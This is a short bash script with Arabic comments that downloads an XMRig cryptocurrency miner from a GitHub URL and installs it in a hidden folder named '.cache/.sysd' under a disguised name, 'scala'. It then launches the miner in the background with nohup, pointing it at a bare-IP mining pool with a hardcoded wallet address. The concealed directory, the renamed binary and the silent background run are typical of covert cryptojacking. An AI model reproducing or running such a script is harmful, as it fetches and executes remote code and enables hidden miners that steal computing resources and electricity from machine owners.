#!/bin/bash

# إعداد بيانات المحفظة والمعدّن
WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
WORKER="js2"
POOL="45.155.102.89:443"
THREADS=4
# مجلد العمل
WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل النسخة الجاهزة من XMRig (Linux x64)
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz

# فك الضغط
tar -xvf scala.tar.gz --strip=1
rm scala.tar.gz

# تشغيل المعدّن في الخلفية باستخدام nohup
nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &

